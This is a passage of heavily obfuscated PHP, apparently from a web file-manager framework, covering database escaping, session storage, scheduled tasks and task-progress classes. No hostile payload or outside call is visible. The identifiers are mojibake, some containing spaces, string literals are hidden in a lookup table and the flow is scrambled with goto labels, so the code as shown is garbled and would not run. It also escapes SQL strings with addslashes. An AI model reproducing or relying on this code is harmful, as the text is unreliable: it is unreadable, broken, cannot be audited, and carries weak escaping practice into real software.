$cÍ“¼â¨›ô[848]: $BáÛÚæÅ¢­ = explode($cÍ“¼â¨›ô[47], $BáÛÚæÅ¢­); if (count($BáÛÚæÅ¢­) > 1) { $eøÛåËŒáÑ .= $cÍ“¼â¨›ô[48] . $BáÛÚæÅ¢­[1] . $cÍ“¼â¨›ô[49] . $BáÛÚæÅ¢­[0] . $cÍ“¼â¨›ô[50]; } else { $eøÛåËŒáÑ .= $cÍ“¼â¨›ô[48] . $BáÛÚæÅ¢­[0] . $cÍ“¼â¨›ô[50]; } break; case $cÍ“¼â¨›ô[829]: case $cÍ“¼â¨›ô[847]: break; case $cÍ“¼â¨›ô[831]: break; case $cÍ“¼â¨›ô[830]: case $cÍ“¼â¨›ô[832]: break; case $cÍ“¼â¨›ô[859]: default: $eøÛåËŒáÑ .= $cÍ“¼â¨›ô[48] . $BáÛÚæÅ¢­ . $cÍ“¼â¨›ô[50]; } } return $eøÛåËŒáÑ; } public function parseKey(&$B•‘«ÇÉ»Ö, $B«‘Ñ±Üê = true) { $B‘‹®©í¤˜ =& $_SERVER[‚Ğ°–—î]; if ($B«‘Ñ±Üê) { $B•‘«ÇÉ»Ö = $this->parseKeyCheck($B•‘«ÇÉ»Ö); } if ($this->dbType == $B‘‹®©í¤˜[859]) { if ($B•‘«ÇÉ»Ö != $B‘‹®©í¤˜[176] && !preg_match($B‘‹®©í¤˜[823], $B•‘«ÇÉ»Ö)) { $B•‘«ÇÉ»Ö = $B‘‹®©í¤˜[824] . trim($B•‘«ÇÉ»Ö, $B‘‹®©í¤˜[824]) . $B‘‹®©í¤˜[824]; } return $B•‘«ÇÉ»Ö; } else { return parent::parseKey($B•‘«ÇÉ»Ö); } } public function close() { $this->_linkID = null; } public function error() { $cÈ©ªµ²„ =& $_SERVER[‚Ğ°–—î]; if ($this->PDOStatement) { $e¨Æ«…ñâ = $this->PDOStatement->errorInfo(); $this->error = $e¨Æ«…ñâ[1] . $cÈ©ªµ²„[4] . $e¨Æ«…ñâ[2]; } else { $this->error = $cÈ©ªµ²„[33]; } if ($cÈ©ªµ²„[33] != $this->queryStr) { $this->error .= LNG($cÈ©ªµ²„[45]) . $this->queryStr; } think_trace($this->error, $cÈ©ªµ²„[33], $cÈ©ªµ²„[46]); return $this->error; } public function escapeString($fœ²â‰«µ­) { $e“èÁÕ”½È =& $_SERVER[‚Ğ°–—î]; switch ($this->dbType) { case $e“èÁÕ”½È[856]: case $e“èÁÕ”½È[829]: case $e“èÁÕ”½È[847]: case $e“èÁÕ”½È[859]: return addslashes($fœ²â‰«µ­); case $e“èÁÕ”½È[831]: case $e“èÁÕ”½È[848]: case $e“èÁÕ”½È[830]: case $e“èÁÕ”½È[832]: return str_ireplace($e“èÁÕ”½È[55], $e“èÁÕ”½È[56], $fœ²â‰«µ­); } } protected function parseValue($A¼Ù³Ø¹Äê) { $Fò‘Âˆİ‡Á =& $_SERVER[‚Ğ°–—î]; if (is_string($A¼Ù³Ø¹Äê)) { $A¼Ù³Ø¹Äê = strpos($A¼Ù³Ø¹Äê, $Fò‘Âˆİ‡Á[4]) === 0 ? $this->escapeString($A¼Ù³Ø¹Äê) : $Fò‘Âˆİ‡Á[869] . $this->escapeString($A¼Ù³Ø¹Äê) . $Fò‘Âˆİ‡Á[869]; } elseif (isset($A¼Ù³Ø¹Äê[0]) && is_string($A¼Ù³Ø¹Äê[0]) && strtolower($A¼Ù³Ø¹Äê[0]) == $Fò‘Âˆİ‡Á[285]) { $A¼Ù³Ø¹Äê = $this->escapeString($A¼Ù³Ø¹Äê[1]); } elseif (is_array($A¼Ù³Ø¹Äê)) { $A¼Ù³Ø¹Äê = array_map(array($this, $Fò‘Âˆİ‡Á[870]), $A¼Ù³Ø¹Äê); } elseif (is_bool($A¼Ù³Ø¹Äê)) { $A¼Ù³Ø¹Äê = $A¼Ù³Ø¹Äê ? $Fò‘Âˆİ‡Á[83] : $Fò‘Âˆİ‡Á[468]; } elseif (is_null($A¼Ù³Ø¹Äê)) { $A¼Ù³Ø¹Äê = $Fò‘Âˆİ‡Á[99]; } return $A¼Ù³Ø¹Äê; } public function getLastInsertId() { $E°¨Õˆ¸ì† =& $_SERVER[‚Ğ°–—î]; switch ($this->dbType) { case $E°¨Õˆ¸ì†[856]: case $E°¨Õˆ¸ì†[848]: case $E°¨Õˆ¸ì†[829]: case $E°¨Õˆ¸ì†[847]: case $E°¨Õˆ¸ì†[831]: case $E°¨Õˆ¸ì†[859]: return $this->_linkID->lastInsertId(); case $E°¨Õˆ¸ì†[830]: case $E°¨Õˆ¸ì†[832]: $d›Å’œ»³£ = $this->table; $dÂŠèßŞ = $this->query("\x53\x45\x4c\105\x43\124\40{$d›Å’œ»³£}\56\x63\165\x72\162\166\141\154\x20\143\165\x72\162\166\x61\154\x20\106\x52\117\x4d\40\144\x75\141\x6c"); return $dÂŠèßŞ ? $dÂŠèßŞ[0][$E°¨Õˆ¸ì†[871]] : 0; } } } goto F•“Äô°í; E¬¿ÄÜã‚Ş: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto eÎ²¨÷Æ¡ğ; fÁƒ…ßàÕ: $AĞÄ×Àœİë = _get($GLOBALS, $aŞø±÷ÍÆ¼[1399], $AĞÄ×Àœİë); if (self::$sessionSign) { } else { if (Cookie::get($AĞÄ×Àœİë)) { self::$sessionSign = Cookie::get($AĞÄ×Àœİë); } else { self::$sessionSign = guid(); } } Cookie::setSafe($AĞÄ×Àœİë, self::$sessionSign, self::$sessionTime); goto f·Ç¤«áœ; F‹¨Ş×Üô×: return $A•¬ß“—ÊÖ; goto cšäô‚·œø; e¹İË¬£‰: switch ($F©æåÒòÈå) { case $aŞø±÷ÍÆ¼[17]: self::$handle = Model($aŞø±÷ÍÆ¼[756]); break; case $aŞø±÷ÍÆ¼[757]: self::$handle = new CacheRedis($F£’èâ×ñ³, $Bïù‘§õÛ); break; case $aŞø±÷ÍÆ¼[758]: self::$handle = new CacheMemcached($F£’èâ×ñ³, $Bïù‘§õÛ); break; case $aŞø±÷ÍÆ¼[167]: $F£’èâ×ñ³[$aŞø±÷ÍÆ¼[75]] = $F£’èâ×ñ³[$aŞø±÷ÍÆ¼[75]] . $aŞø±÷ÍÆ¼[1401]; self::$handle = new CacheFile($F£’èâ×ñ³, $Bïù‘§õÛ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $A•¬ß“—ÊÖ = new self(); goto F‹¨Ş×Üô×; aÄ–ÊÜ©ŠÕ: $FÇ¬˜Üõë¿ = $GLOBALS[$aŞø±÷ÍÆ¼[6]][$aŞø±÷ÍÆ¼[337]]; self::$sessionTime = $FÇ¬˜Üõë¿[$aŞø±÷ÍÆ¼[1398]]; $AĞÄ×Àœİë = SESSION_ID; goto fÁƒ…ßàÕ; eÎ²¨÷Æ¡ğ: $aŞø±÷ÍÆ¼ =& $_SERVER[‚Ğ°–—î]; static $A•¬ß“—ÊÖ = false; if ($A•¬ß“—ÊÖ) { return $A•¬ß“—ÊÖ; } goto aÄ–ÊÜ©ŠÕ; f·Ç¤«áœ: $F©æåÒòÈå = $FÇ¬˜Üõë¿[$aŞø±÷ÍÆ¼[1400]]; $F£’èâ×ñ³ = $FÇ¬˜Üõë¿[$F©æåÒòÈå]; $Bïù‘§õÛ = $FÇ¬˜Üõë¿[$aŞø±÷ÍÆ¼[755]]; goto e¹İË¬£‰; cšäô‚·œø: } public static function sign($dÏØ›Æ‹ÅÆ = false) { $dÏØ›Æ‹ÅÆ && (self::$sessionSign = $dÏØ›Æ‹ÅÆ); self::init(); return self::$sessionSign; } public static function set($f‘ˆÉ„‘ºø, $bÓğ…ŸĞœÔ = false) { self::init(); if (is_array($f‘ˆÉ„‘ºø)) { foreach ($f‘ˆÉ„‘ºø as $B³Ÿ”É¾® => $EÍÑ×©®‚Ÿ) { array_set_value(self::$data, $B³Ÿ”É¾®, $EÍÑ×©®‚Ÿ); } } else { array_set_value(self::$data, $f‘ˆÉ„‘ºø, $bÓğ…ŸĞœÔ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Fª‚§¨ù­î = false) { self::init(); if (!$Fª‚§¨ù­î) { return self::$data; } return array_get_value(self::$data, $Fª‚§¨ù­î); } public static function remove($có˜ØîŒ¾) { self::init(); unset(self::$data[$có˜ØîŒ¾]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[‚Ğ°–—î][760])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto Cˆæ”¦Æ”ä; Cˆæ”¦Æ”ä: $FØÕÆÁ÷‡Î =& $_SERVER[‚Ğ°–—î]; if (self::valueGet($FØÕÆÁ÷‡Î[688]) != $FØÕÆÁ÷‡Î[83]) { return; } if (self::valueGet($FØÕÆÁ÷‡Î[1402]) == $FØÕÆÁ÷‡Î[83]) { $DÕ˜›Áœ¢Ì = self::valueGet($FØÕÆÁ÷‡Î[1403]); if (time() - $DÕ˜›Áœ¢Ì > 3600 * 2) { self::restart(); } return; } goto dÂáåéÔÄ…; eÑ†Öññ¬: while (!0) { self::cacheClear(); if (self::valueGet($FØÕÆÁ÷‡Î[688]) != $FØÕÆÁ÷‡Î[83]) { self::valueSet($FØÕÆÁ÷‡Î[1402], $FØÕÆÁ÷‡Î[468]); self::log($FØÕÆÁ÷‡Î[1406]); die; } self::valueSet($FØÕÆÁ÷‡Î[1402], $FØÕÆÁ÷‡Î[83]); self::valueSet($FØÕÆÁ÷‡Î[1403], time()); self::taskRunAll(); sleep(self::valueGet($FØÕÆÁ÷‡Î[1407])); } goto DÆäíª£±ï; dÂáåéÔÄ…: http_close(); self::valueSet($FØÕÆÁ÷‡Î[1402], $FØÕÆÁ÷‡Î[83]); Hook::bind($FØÕÆÁ÷‡Î[1404], $FØÕÆÁ÷‡Î[1405]); goto eÑ†Öññ¬; DÆäíª£±ï: } public static function restart() { $eƒÅŸÛöÉ¸ =& $_SERVER[‚Ğ°–—î]; http_close(); self::valueSet($eƒÅŸÛöÉ¸[688], $eƒÅŸÛöÉ¸[468]); sleep(self::valueGet($eƒÅŸÛöÉ¸[1407]) + 5); self::valueSet($eƒÅŸÛöÉ¸[1402], $eƒÅŸÛöÉ¸[468]); self::valueSet($eƒÅŸÛöÉ¸[688], $eƒÅŸÛöÉ¸[83]); } public static function shutdownEvent() { $aÕŞ£ïƒÕ‹ =& $_SERVER[‚Ğ°–—î]; self::valueSet($aÕŞ£ïƒÕ‹[1402], $aÕŞ£ïƒÕ‹[468]); self::log($aÕŞ£ïƒÕ‹[1408]); } public static function config($Bì³…ôœƒØ, $C ‹é‹Èë‚) { $F‚Äì‘¦¯‘ =& $_SERVER[‚Ğ°–—î]; $eËãÓ‚ÚÔ = 20; $C ‹é‹Èë‚ = intval($C ‹é‹Èë‚) <= $eËãÓ‚ÚÔ ? $eËãÓ‚ÚÔ : intval($C ‹é‹Èë‚); self::valueSet($F‚Äì‘¦¯‘[688], $Bì³…ôœƒØ); self::valueSet($F‚Äì‘¦¯‘[1407], $C ‹é‹Èë‚); } private static function taskRunAll() { $c˜É×Ã÷İ¡ =& $_SERVER[‚Ğ°–—î]; $bÄ¡Ø–­Ç = Model($c˜É×Ã÷İ¡[1409])->listData(); $DŸÆöŠ¢¸µ = count($bÄ¡Ø–­Ç); for ($cÔˆ‹Şˆ± = 0; $cÔˆ‹Şˆ± < $DŸÆöŠ¢¸µ; $cÔˆ‹Şˆ±++) { $FÌ—Ò˜íù“ = $bÄ¡Ø–­Ç[$cÔˆ‹Şˆ±]; if ($FÌ—Ò˜íù“[$c˜É×Ã÷İ¡[1410]] != $c˜É×Ã÷İ¡[83]) { continue; } if (!self::taskTimeCheck($FÌ—Ò˜íù“)) { continue; } self::taskRun($FÌ—Ò˜íù“); } Hook::trigger($c˜É×Ã÷İ¡[1411]); } private static function taskTimeCheck($AãîÕªª ¼) { goto DŸ‚‹œËõ•; DŸ‚‹œËõ•: $b´§¿â“Í =& $_SERVER[‚Ğ°–—î]; $DÊ¡Ë“Û™¯ = json_decode($AãîÕªª ¼[$b´§¿â“Í[190]], !0); $aÑçÃ¶å– = intval($AãîÕªª ¼[$b´§¿â“Í[1403]]); goto DÕÙÍ°±…»; DÕÙÍ°±…»: $bˆƒÁÄŒë³ = strtotime($b´§¿â“Í[1412] . $DÊ¡Ë“Û™¯[$b´§¿â“Í[1413]] . $b´§¿â“Í[1414]) - strtotime($b´§¿â“Í[1415]); $cù¯îæ´Ú› = time() - strtotime(date($b´§¿â“Í[1416]) . $b´§¿â“Í[1417]); $c«®ƒí„¥Ï = $cù¯îæ´Ú› >= $bˆƒÁÄŒë³ && $cù¯îæ´Ú› <= $bˆƒÁÄŒë³ + 3600; goto d½»„Í÷‹á; d½»„Í÷‹á: switch ($DÊ¡Ë“Û™¯[$b´§¿â“Í[29]]) { case $b´§¿â“Í[1418]: if (time() - $aÑçÃ¶å– < 3600 * 24 * 30) { return !1; } if ($DÊ¡Ë“Û™¯[$b´§¿â“Í[1418]] == date($b´§¿â“Í[1419]) && $c«®ƒí„¥Ï) { return !0; } break; case $b´§¿â“Í[1420]: if (time() - $aÑçÃ¶å– < 3600 * 24 * 7) { return !1; } $CìÚÎ‡ÚçŸ = date($b´§¿â“Í[1421]) == 0 ? 7 : date($b´§¿â“Í[1421]); if ($DÊ¡Ë“Û™¯[$b´§¿â“Í[1420]] == $CìÚÎ‡ÚçŸ && $c«®ƒí„¥Ï) { return !0; } break; case $b´§¿â“Í[1413]: if (time() - $aÑçÃ¶å– < 3600 * 24) { return !1; } if ($c«®ƒí„¥Ï) { return !0; } break; case $b´§¿â“Í[1422]: if (time() - $aÑçÃ¶å– >= floatval($DÊ¡Ë“Û™¯[$b´§¿â“Í[1422]]) * 60) { return !0; } break; default: break; } return !1; goto E›»×øÍ£ˆ; E›»×øÍ£ˆ: } public static function taskRun($B£òŒ¬„ù¨) { goto D’Ç–³¥áÏ; aó”ä¥ì•À: Model($Bİ†ÉÑµ¿œ[1427])->add(array($Bİ†ÉÑµ¿œ[1428] => $Bİ†ÉÑµ¿œ[33], $Bİ†ÉÑµ¿œ[1429] => $Bİ†ÉÑµ¿œ[468], $Bİ†ÉÑµ¿œ[29] => $Bİ†ÉÑµ¿œ[1430] . $B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[367]], $Bİ†ÉÑµ¿œ[1431] => json_encode(array($Bİ†ÉÑµ¿œ[28] => $B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[28]], $Bİ†ÉÑµ¿œ[1432] => timeFloat() - $D–ä»Íéô, $Bİ†ÉÑµ¿œ[281] => $d³ìÇğæ…©)))); self::log($Bİ†ÉÑµ¿œ[1433] . $B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[367]] . $Bİ†ÉÑµ¿œ[1434] . $d³ìÇğæ…©); return !0; goto aµ¾šºÚç; D’Ç–³¥áÏ: $Bİ†ÉÑµ¿œ =& $_SERVER[‚Ğ°–—î]; self::log($Bİ†ÉÑµ¿œ[1423] . $B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[367]] . $Bİ†ÉÑµ¿œ[1424] . $B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[28]] . $Bİ†ÉÑµ¿œ[1425] . $B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[1426]]); Model($Bİ†ÉÑµ¿œ[1409])->run($B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[367]]); goto d¯Îí·ã‰å; d¯Îí·ã‰å: $D–ä»Íéô = timeFloat(); $d³ìÇğæ…© = $Bİ†ÉÑµ¿œ[33]; switch ($B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[29]]) { case $Bİ†ÉÑµ¿œ[295]: $D¾À×¤Õ¶Ó = url_request($B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[1426]], $Bİ†ÉÑµ¿œ[216], !1, !1, !1, !1, 5); $d³ìÇğæ…© = strlen($D¾À×¤Õ¶Ó); break; case $Bİ†ÉÑµ¿œ[215]: $d³ìÇğæ…© = Hook::apply($B£òŒ¬„ù¨[$Bİ†ÉÑµ¿œ[1426]]); default: break; } goto aó”ä¥ì•À; aµ¾šºÚç: } private static function valueGet($dêãŸÆ‹í) { $BœÓñ÷†ô =& $_SERVER[‚Ğ°–—î]; $B°º¿›‚´™ = $BœÓñ÷†ô[1435]; $AÆÃÎ¿Õ‘° = Model($BœÓñ÷†ô[1436])->get($dêãŸÆ‹í, $B°º¿›‚´™); if (is_null($AÆÃÎ¿Õ‘°)) { Model($BœÓñ÷†ô[1436])->set($BœÓñ÷†ô[1407], 10, $B°º¿›‚´™); Model($BœÓñ÷†ô[1436])->set($BœÓñ÷†ô[688], $BœÓñ÷†ô[83], $B°º¿›‚´™); Model($BœÓñ÷†ô[1436])->set($BœÓñ÷†ô[1402], $BœÓñ÷†ô[468], $B°º¿›‚´™); $AÆÃÎ¿Õ‘° = Model($BœÓñ÷†ô[1436])->get($dêãŸÆ‹í, $B°º¿›‚´™); } return $AÆÃÎ¿Õ‘°; } private static function valueSet($CíÁ­ŸîÎ, $e…İ¼öÇª) { $AÑ™ÚåÇñ… =& $_SERVER[‚Ğ°–—î]; return Model($AÑ™ÚåÇñ…[1436])->set($CíÁ­ŸîÎ, $e…İ¼öÇª, $AÑ™ÚåÇñ…[1435]); } protected static function log($b¦‰åÁ£Ñ‹) { write_log($b¦‰åÁ£Ñ‹, $_SERVER[‚Ğ°–—î][1437]); } private static function cacheClear() { $DÕ›ÑŠùâå =& $_SERVER[‚Ğ°–—î]; $c¾¶¯ó‹ = Model($DÕ›ÑŠùâå[1436])->cacheKey($DÕ›ÑŠùâå[1435]); Cache::clearMemory($c¾¶¯ó‹); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\156\x69\156\x67"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($FÛó¹ÛÃì, $aÍ¶ÊãÚë = '', $Fåù°í·¬õ = 0, $a™³ğä§Ê = '') { goto CäÏ‚¾îĞ; B´Û¤Ç§: Hook::trigger($CÛ÷ëŒ¡Ï¼[1449], $this->task); $this->task[$CÛ÷ëŒ¡Ï¼[1443]] = timeFloat(); goto D­•Ôà•¡â; fí’ö§ÅÀ÷: Hook::bind($CÛ÷ëŒ¡Ï¼[1404], array($this, $CÛ÷ëŒ¡Ï¼[1446])); Hook::bind($CÛ÷ëŒ¡Ï¼[1447], array($this, $CÛ÷ëŒ¡Ï¼[1448])); $this->startAfter(); goto B´Û¤Ç§; CäÏ‚¾îĞ: $CÛ÷ëŒ¡Ï¼ =& $_SERVER[‚Ğ°–—î]; if (self::get($FÛó¹ÛÃì)) { return; } $this->task = array($CÛ÷ëŒ¡Ï¼[367] => $FÛó¹ÛÃì, $CÛ÷ëŒ¡Ï¼[1438] => USER_ID, $CÛ÷ëŒ¡Ï¼[1344] => $a™³ğä§Ê, $CÛ÷ëŒ¡Ï¼[29] => $aÍ¶ÊãÚë, $CÛ÷ëŒ¡Ï¼[979] => $CÛ÷ëŒ¡Ï¼[33], $CÛ÷ëŒ¡Ï¼[977] => $Fåù°í·¬õ, $CÛ÷ëŒ¡Ï¼[991] => 0, $CÛ÷ëŒ¡Ï¼[1439] => 0, $CÛ÷ëŒ¡Ï¼[1440] => 0, $CÛ÷ëŒ¡Ï¼[1441] => timeFloat(), $CÛ÷ëŒ¡Ï¼[1442] => 0, $CÛ÷ëŒ¡Ï¼[1443] => 0, $CÛ÷ëŒ¡Ï¼[1444] => 0, $CÛ÷ëŒ¡Ï¼[1445] => 0, $CÛ÷ëŒ¡Ï¼[688] => $CÛ÷ëŒ¡Ï¼[1402]); goto fí’ö§ÅÀ÷; D­•Ôà•¡â: } public function end() { goto Eãƒ¶·ç–á; cÂÀ‚ïÅŞÍ: Hook::unbind($F«ÙŒšÊÃƒ[1447], array($this, $F«ÙŒšÊÃƒ[1448])); $this->endAfter(); $this->task = !1; goto BÙîá«É™; Eãƒ¶·ç–á: $F«ÙŒšÊÃƒ =& $_SERVER[‚Ğ°–—î]; if (!$this->task) { return; } if ($this->task[$F«ÙŒšÊÃƒ[1443]]) { self::valueSet($this->task[$F«ÙŒšÊÃƒ[367]], !1); } goto A¸›Ï ¿…’; A¸›Ï ¿…’: $C‰àÓÒ›Ëö = timeFloat() - $this->task[$F«ÙŒšÊÃƒ[1441]]; self::log($F«ÙŒšÊÃƒ[1450] . $this->task[$F«ÙŒšÊÃƒ[367]] . $F«ÙŒšÊÃƒ[1451] . $C‰àÓÒ›Ëö . $F«ÙŒšÊÃƒ[1452]); Hook::unbind($F«ÙŒšÊÃƒ[1404], array($this, $F«ÙŒšÊÃƒ[1446])); goto cÂÀ‚ïÅŞÍ; BÙîá«É™: } public function update($B°ˆÆÒ÷Ú = 0) { goto dš„ƒ…î‚—; e³âêÖ§‰Œ: $this->updateAfter(); $C¤êÁÂ®¨ = 0.2; if (timeFloat() - $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1443]] < $C¤êÁÂ®¨) { return; } goto C»ÎÂ«÷¨…; C»ÎÂ«÷¨…: $EÎŸ§‹£” = self::get($cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[367]]); $AÓğÑšËâˆ = $EÎŸ§‹£”[$Eì†ğƒ²Š¤[688]]; if ($AÓğÑšËâˆ == self::STATYS_KILL) { $bÅ¹Ìâ§ôí = array($Eì†ğƒ²Š¤[1453] => LNG($Eì†ğƒ²Š¤[1454]), $Eì†ğƒ²Š¤[1033] => !1); Cache::set($Eì†ğƒ²Š¤[1455] . $this->task[$Eì†ğƒ²Š¤[367]], $bÅ¹Ìâ§ôí, 30); $this->end(); die; } else { if ($AÓğÑšËâˆ == self::STATYS_STOP) { $d¹…ß½î‰‹ = 2; $EÎŸ§‹£”[$Eì†ğƒ²Š¤[1444]] += $d¹…ß½î‰‹; self::valueSet($cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[367]], $EÎŸ§‹£”); sleep($d¹…ß½î‰‹); $this->update(); return; } } goto fÒğå©„‰¬; eÒœ­®Œ: Hook::trigger($Eì†ğƒ²Š¤[1456], $cŞ•ƒØãÅÇ); self::valueSet($cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[367]], $cŞ•ƒØãÅÇ); goto B¶ÙÛÑ„ì; dš„ƒ…î‚—: $Eì†ğƒ²Š¤ =& $_SERVER[‚Ğ°–—î]; $cŞ•ƒØãÅÇ =& $this->task; if (!$cŞ•ƒØãÅÇ) { return; } goto fœß½£Ú©¬; fœß½£Ú©¬: $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[991]] += $B°ˆÆÒ÷Ú; $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1442]] = timeFloat(); if ($cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[977]]) { if ($cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[977]] < $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[991]]) { $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[977]] = $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[991]]; } $fùÙˆÍ†Î = timeFloat() - $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1441]] - $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1444]]; $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1439]] = $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[991]] / $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[977]]; $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1440]] = $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[991]] / $fùÙˆÍ†Î; if ($cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1439]] > 0) { $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1445]] = $fùÙˆÍ†Î * (1 - $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1439]]) / $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1439]]; } $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1445]] = $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1445]] <= 0 ? 0 : $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1445]]; } goto e³âêÖ§‰Œ; fÒğå©„‰¬: $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[688]] = $AÓğÑšËâˆ ? $AÓğÑšËâˆ : $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[688]]; $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1444]] = $EÎŸ§‹£”[$Eì†ğƒ²Š¤[1444]] ? $EÎŸ§‹£”[$Eì†ğƒ²Š¤[1444]] : 0; $cŞ•ƒØãÅÇ[$Eì†ğƒ²Š¤[1443]] = timeFloat(); goto eÒœ­®Œ; B¶ÙÛÑ„ì: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($A¥Æ£ã—ß) { $F¥ïáçö´Î =& $_SERVER[‚Ğ°–—î]; Cache::set($F¥ïáçö´Î[1455] . $this->task[$F¥ïáçö´Î[367]], $A¥Æ£ã—ß, 60); return $A¥Æ£ã—ß; } public static function get($FàÖ¸®Ìî®) { return self::valueGet($FàÖ¸®Ìî®); } public static function listData() { $E›•Ú¶ƒ—Ö = self::valueGet(); return array_sort_by($E›•Ú¶ƒ—Ö, $_SERVER[‚Ğ°–—î][1441], !0); } public static function kill($dœ³¨ê¶ˆ) { return self::changeStatus($dœ³¨ê¶ˆ, self::STATYS_KILL); } public static function stop($A¢¾·èŞ…) { return self::changeStatus($A¢¾·èŞ…, self::STATYS_STOP); } public static function restart($bº‚ˆ¶¼‚) { return self::changeStatus($bº‚ˆ¶¼‚, self::STATYS_RUNNING); } public static function killAll() { $E—ãî‡¯í× =& $_SERVER[‚Ğ°–—î]; $Aå½•Úù = self::listData(); foreach ($Aå½•Úù as $Dã¬ƒÂÒõÌ) { self::kill($Dã¬ƒÂÒõÌ[$E—ãî‡¯í×[367]]); } sleep(2); foreach ($Aå½•Úù as $Dã¬ƒÂÒõÌ) { self::valueSet($Dã¬ƒÂÒõÌ[$E—ãî‡¯í×[367]], !1); } } private static function changeStatus($fé„ğ©Š©Æ, $DÛØ–·Åƒ•) { goto cÔ¤éÓšÍ; cÔ¤éÓšÍ: $e”¢•¾ÓÌÀ =& $_SERVER[‚Ğ°–—î]; $e‰Ëáàƒ¶Â = self::valueGet($fé„ğ©Š©Æ); if (!$e‰Ëáàƒ¶Â) { return !1; } goto DÏªë‘½š; DÏªë‘½š: $e‰Ëáàƒ¶Â[$e”¢•¾ÓÌÀ[688]] = $DÛØ–·Åƒ•; self::valueSet($fé„ğ©Š©Æ, $e‰Ëáàƒ¶Â); self::log($e”¢•¾ÓÌÀ[1457] . $e‰Ëáàƒ¶Â[$e”¢•¾ÓÌÀ[367]] . $e”¢•¾ÓÌÀ[1458] . $DÛØ–·Åƒ•); goto fŠÂœ«ÁÚ; fŠÂœ«ÁÚ: return !0; goto aµÁïÏ…Ü; aµÁïÏ…Ü: } public static function valueGet($c·¦ŠèÊ¼» = false) { $fá¾‡É£ñê =& $_SERVER[‚Ğ°–—î]; if ($c·¦ŠèÊ¼») { $dÍÑäÏï‹Ü = Model($fá¾‡É£ñê[399])->where(array($fá¾‡É£ñê[89] => $c·¦ŠèÊ¼», $fá¾‡É£ñê[29] => $fá¾‡É£ñê[1459]))->find(); return $dÍÑäÏï‹Ü ? json_decode($dÍÑäÏï‹Ü[$fá¾‡É£ñê[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($b©„Ş¤Ù„‚ = false) { goto CÂ¡¡ö˜½¢; bÉ‡´ö: $eùšÓÙŒöÏ = Model($BºÁà‹ìœÁ[399])->where($F£½ˆÕ¶öâ)->select(); $eùšÓÙŒöÏ = $eùšÓÙŒöÏ ? $eùšÓÙŒöÏ : array(); foreach ($eùšÓÙŒöÏ as $c¬¨è‰¿åÁ => $A‹Óé¡‡Ó«) { $eùšÓÙŒöÏ[$c¬¨è‰¿åÁ] = json_decode($A‹Óé¡‡Ó«[$BºÁà‹ìœÁ[359]], !0); } goto A×¶»»÷ã; CÂ¡¡ö˜½¢: $BºÁà‹ìœÁ =& $_SERVER[‚Ğ°–—î]; $F£½ˆÕ¶öâ = array($BºÁà‹ìœÁ[29] => $BºÁà‹ìœÁ[1459]); if ($b©„Ş¤Ù„‚) { $F£½ˆÕ¶öâ[$BºÁà‹ìœÁ[1438]] = $b©„Ş¤Ù„‚; } goto bÉ‡´ö; A×¶»»÷ã: return $eùšÓÙŒöÏ; goto d†’ˆÒ÷àø; d†’ˆÒ÷àø: } public static function valueSet($B•¹¾ÚÙ¾», $b¨õô±™Í) { goto Bİ·§±‡—; b®‘´˜‘: if (!$f‰¯ĞŠÚÈÀ) { ob_start(); var_dump($b¨õô±™Í); $cÂÂ‘°Ú»¤ = ob_get_clean(); self::log($E‡•´¯æ¼±[1460] . json_encode_force($cÂÂ‘°Ú»¤)); } if (!$B•¹¾ÚÙ¾» || 